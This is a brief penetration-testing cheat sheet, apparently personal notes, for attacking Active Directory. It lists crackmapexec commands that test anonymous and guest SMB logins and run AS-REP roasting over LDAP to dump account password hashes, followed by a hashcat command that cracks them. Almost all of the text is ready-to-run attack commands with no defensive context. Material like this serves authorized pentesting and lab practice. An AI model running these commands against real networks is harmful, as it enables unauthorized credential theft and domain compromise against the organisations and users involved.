### SMB

check anon login. The output may also give information about the domain name and user.

```
crackmapexec smb 1.1.1.1 -u '' -p ''

crackmapexec smb 1.1.1.1 -u 'guest' -p ''
```

### LDAP

#### AS-REP

without authentication

```
crackmapexec ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
crackmapexec ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```

with authentication

```
crackmapexec ldap 192.168.0.104 -u harry -p pass --asreproast output.txt

if failed domain name resolution:
cme ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain_name
```

then just crack the hashes

```
hashcat -m18200 output.txt wordlist
```